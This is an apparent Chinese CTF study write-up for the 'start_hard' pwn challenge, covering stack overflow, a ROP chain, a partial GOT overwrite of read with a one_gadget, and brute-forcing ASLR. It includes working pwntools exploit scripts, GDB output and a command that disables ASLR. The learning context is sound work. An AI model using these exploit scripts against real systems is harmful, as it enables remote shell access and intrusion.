&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/tmp/starthard/start_hard&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64-&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No PIE (&lt;span class=&#34;number&#34;&gt;0x400000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;用one_gadget看有没有&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;-ubuntu:/tmp/starthard&lt;span class=&#34;comment&#34;&gt;# one_gadget ./libc.so.6 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x4526a&lt;/span&gt; execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsp+&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;] == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xef6c4&lt;/span&gt; execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsp+&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;] == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf0567&lt;/span&gt; execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsp+&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;] == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gef➤  telescope&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fffffffe460&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0000&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x007fffffffe568&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0x007fffffffe7be&lt;/span&gt;  →  &lt;span class=&#34;string&#34;&gt;&amp;quot;/tmp/starthard/start_hard&amp;quot;&lt;/span&gt;	 ← $rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fffffffe468&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0008&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0000000100400430&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fffffffe470&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0010&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x6161616161616161&lt;/span&gt;	 ← $rsi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fffffffe478&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0018&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x6161616161616161&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fffffffe480&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0020&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x6161616161616161&lt;/span&gt;	 ← $rbp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fffffffe488&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0028&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x007ffff7a03c0a&lt;/span&gt;  →  &amp;lt;__libc_start_main+&lt;span class=&#34;number&#34;&gt;106&lt;/span&gt;&amp;gt; mov rsi, QWORD PTR [rsp+&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		溢出24字节,然后加上0x4526a即可,但是一直打失败了…是因为libc的问题吧,需要链接上 或者用本地的&lt;/p&gt;
&lt;p&gt;​		0x4526a这个地址行吗???,这个地址是什么地址?? &lt;/p&gt;
&lt;p&gt;2023 7 28: 		感觉思路没啥问题呀… 是不是可以爆破,是加了随机化是吗… 哦对…是libc中的one_gadget呀..那肯定加了随机化…&lt;/p&gt;
&lt;p&gt;随机化了三个字符, 所以能怎么输入呢?&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;exploit&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./start_hard&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;24&lt;/span&gt; + p16(&lt;span class=&#34;number&#34;&gt;0xeafe&lt;/span&gt;) + p8(&lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# Add some delay after each attempt to avoid rapid execution issues&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    time.sleep(&lt;span class=&#34;number&#34;&gt;0.5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# Read the output from the process&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# Check if the exploit was successful and print the result&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;b&amp;quot;Flag&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; response:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] Exploit successful! Flag:&amp;quot;&lt;/span&gt;, response.split(&lt;span class=&#34;string&#34;&gt;b&amp;quot;\n&amp;quot;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Exploit failed.&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Number of attempts you want to perform&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;num_attempts = &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; _ &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(num_attempts):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    exploit()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-4-one-gadget/image-20231116210352866.png&#34; alt=&#34;image-20231116210352866&#34;&gt;&lt;/p&gt;
&lt;p&gt;在之前发送命令就可以!!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-4-one-gadget/image-20230729095606345.png&#34; alt=&#34;image-20230729095606345&#34;&gt;&lt;/p&gt;
&lt;p&gt;把回车重定向进去就可以了把&lt;/p&gt;
&lt;p&gt;python3 final.py &amp;lt; huiche &amp;gt; tmp&lt;/p&gt;
&lt;h1 id=&#34;问题来源-不知道libc的加载基地址&#34;&gt;&lt;a href=&#34;#问题来源-不知道libc的加载基地址&#34; class=&#34;headerlink&#34; title=&#34;问题来源:不知道libc的加载基地址&#34;&gt;&lt;/a&gt;问题来源:不知道libc的加载基地址&lt;/h1&gt;&lt;p&gt;​		需要解决如何获得libc基址,但是刚才用vmmap查看,然后相加了呀,为啥不行呢?就算可以,对方是远程的,所以这样应该不行…应该需要先打印出来?&lt;/p&gt;
&lt;p&gt;​		不是的,它是因为开了PIE,会有随机化,每次地址都会变&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;h2 id=&#34;解决办法&#34;&gt;&lt;a href=&#34;#解决办法&#34; class=&#34;headerlink&#34; title=&#34;解决办法&#34;&gt;&lt;/a&gt;解决办法&lt;/h2&gt;&lt;p&gt;​		libc中的各种函数的相对地址是固定的,按照往常套路,我们需要先泄露出一个函数的地址,然后计算偏移,但是在本题中没法进行泄露(或许可以????)&lt;/p&gt;
&lt;p&gt;​		题解给的办法是,因为我们有read函数,可以利用它和onegadget的偏移,通过爆破?寻找onegadget,直接把read的got表给修改了成onegadget的,然后再次进行调用read就是调用onegadget了,就可以getshell了&lt;br&gt;​		所以思路应该是通过栈溢出构造gadget链子,先利用read函数,把read的got表改成onegadget的,然后返回main函数重新执行即可&lt;/p&gt;
&lt;h2 id=&#34;构造payload&#34;&gt;&lt;a href=&#34;#构造payload&#34; class=&#34;headerlink&#34; title=&#34;构造payload&#34;&gt;&lt;/a&gt;构造payload&lt;/h2&gt;&lt;p&gt;​	&lt;strong&gt;ssize_t read(int&lt;/strong&gt; &lt;em&gt;fd&lt;/em&gt;&lt;strong&gt;, void buf&lt;/strong&gt;&lt;em&gt;, size_t&lt;/em&gt;* &lt;em&gt;count&lt;/em&gt;**); read函数的含义是,从fd中读取count数据,写入到buf中,&lt;/p&gt;
&lt;p&gt;​		问题是怎么构造read呢? 首先我们知道read的符号地址,可以直接进行调用,然后通过寄存器设置参数, count是不是可以不用设置??&lt;br&gt;寻找pop rsi的gadget,传入read的got地址到buf变量,然后设置fd为onegadget的地址,然后最后将返回地址设置为main的就可以了!&lt;/p&gt;
&lt;h2 id=&#34;关于onegadget地址的传参问题&#34;&gt;&lt;a href=&#34;#关于onegadget地址的传参问题&#34; class=&#34;headerlink&#34; title=&#34;关于onegadget地址的传参问题&#34;&gt;&lt;/a&gt;关于onegadget地址的传参问题&lt;/h2&gt;&lt;p&gt;​		但是问题是题解中的onegadget的地址是直接传参传进来的,不是通过设置rdi,这是为啥呢???&lt;br&gt;​		是因为此时rdi为0,所以从标准输入中获取嘛?我觉得应该是,并且这个让我想到了pwnable的第一题…那应该就不奇怪了&lt;/p&gt;
&lt;h2 id=&#34;关于onegadget-用的libc的问题&#34;&gt;&lt;a href=&#34;#关于onegadget-用的libc的问题&#34; class=&#34;headerlink&#34; title=&#34;关于onegadget 用的libc的问题&#34;&gt;&lt;/a&gt;关于onegadget 用的libc的问题&lt;/h2&gt;&lt;p&gt;​		用的如果是自己的libc的话,&lt;/p&gt;
&lt;p&gt;readelf -s &amp;#x2F;lib&amp;#x2F;x86_64-linux-gnu&amp;#x2F;libc.so.6 | grep read@&lt;/p&gt;
&lt;p&gt;ROPgadget –binary &amp;#x2F;lib&amp;#x2F;x86_64-linux-gnu&amp;#x2F;libc.so.6 –only ‘pop|ret’&lt;/p&gt;
&lt;p&gt;0x000000000002164d : pop rsi ; pop r15 ; ret&lt;/p&gt;
&lt;p&gt;echo 0 &amp;gt; &amp;#x2F;proc&amp;#x2F;sys&amp;#x2F;kernel&amp;#x2F;randomize_va_space&lt;/p&gt;
&lt;h1 id=&#34;最终exp&#34;&gt;&lt;a href=&#34;#最终exp&#34; class=&#34;headerlink&#34; title=&#34;最终exp&#34;&gt;&lt;/a&gt;最终exp&lt;/h1&gt;&lt;p&gt;​		这是作者给的原exp,实际上用的话可能需要简单修改&lt;/p&gt;
&lt;p&gt;​		该exp首先填满缓冲区,然后通过 pop_rsi把read的got表地址赋值给rsi,即后面read的第二个参数buf,也就是我们要覆盖的地址,后面8个A是因为用的gadget多了一个pop r15,填入个垃圾数据就可以了. 然后pop完之后继续往下执行,执行到read的symbols,也就是去执行read函数,此时read还没有第一个参数fd,也就是从哪里读取,但是在调试的时候发现rdi是0,也就是从标准输入读取.不过为什么那么巧,rdi是0呢???万一不是0呢? 如果不是0的话,就需要gadget进行布置了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./start_hard&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rsi = &lt;span class=&#34;number&#34;&gt;0x004005c1&lt;/span&gt;					&lt;span class=&#34;comment&#34;&gt;# pop rsi; pop r15; ret&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;one_gadget = &lt;span class=&#34;number&#34;&gt;0x1147&lt;/span&gt;					&lt;span class=&#34;comment&#34;&gt;# 0xf1147&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pwn&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload  = &lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += p64(pop_rsi) + p64(elf.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;read&amp;#x27;&lt;/span&gt;]) + &lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += p64(elf.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;read&amp;#x27;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += p64(&lt;span class=&#34;number&#34;&gt;0x0040044d&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;# call __libc_start_main&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload  = payload.ljust(&lt;span class=&#34;number&#34;&gt;0x400&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.send(p16(one_gadget))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io = remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;0.0.0.0.&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;10001&lt;/span&gt;)		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# io = process(&amp;#x27;./start_hard&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pwn()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;




&lt;h1 id=&#34;其他需要储备的知识-问题&#34;&gt;&lt;a href=&#34;#其他需要储备的知识-问题&#34; class=&#34;headerlink&#34; title=&#34;其他需要储备的知识 + 问题&#34;&gt;&lt;/a&gt;其他需要储备的知识 + 问题&lt;/h1&gt;&lt;h3 id=&#34;64位传参&#34;&gt;&lt;a href=&#34;#64位传参&#34; class=&#34;headerlink&#34; title=&#34;64位传参&#34;&gt;&lt;/a&gt;64位传参&lt;/h3&gt;&lt;p&gt;和32位 不同的是,要用到寄存器: rdi rsi rdx rcx &lt;/p&gt;
&lt;h3 id=&#34;关于read函数&#34;&gt;&lt;a href=&#34;#关于read函数&#34; class=&#34;headerlink&#34; title=&#34;关于read函数&#34;&gt;&lt;/a&gt;关于read函数&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://man7.org/linux/man-pages/man2/read.2.html&#34;&gt;https://man7.org/linux/man-pages/man2/read.2.html&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;关于下断点调试分析&#34;&gt;&lt;a href=&#34;#关于下断点调试分析&#34; class=&#34;headerlink&#34; title=&#34;关于下断点调试分析&#34;&gt;&lt;/a&gt;关于下断点调试分析&lt;/h3&gt;&lt;p&gt;​			可以在call _read指令后面下断点,然后一点点调试分析&lt;/p&gt;
&lt;p&gt;​		一直以来都犯了一个错误,觉得下断点应该在exp中用pause(),但是一直不知道怎么在payload打出去后,断下来,应该及时和同学交流的,这个问题的答案其实自己早就知道了,只是不知道原来是这样…&lt;/p&gt;
&lt;p&gt;​		gdb.attach(io,”b __libc_start_main”) 其实就是这句, gdb attach的话下个断点就可以了,这样就可以在payload打之后一点点调试了&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/fjh1997/article/details/105434992/&#34;&gt;https://blog.csdn.net/fjh1997/article/details/105434992/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;pop-rsi是把它下面的那个给pop出来-还是找rsp&#34;&gt;&lt;a href=&#34;#pop-rsi是把它下面的那个给pop出来-还是找rsp&#34; class=&#34;headerlink&#34; title=&#34;pop rsi是把它下面的那个给pop出来?还是找rsp?&#34;&gt;&lt;/a&gt;pop rsi是把它下面的那个给pop出来?还是找rsp?&lt;/h3&gt;&lt;p&gt;​		看下面的第六行,这里pop rsi的话,是放在了返回地址,所以当执行到这里的时候,上面的栈的数据就是垃圾数据了,此时pop rsi下面这里是rsp的位置??? &lt;/p&gt;
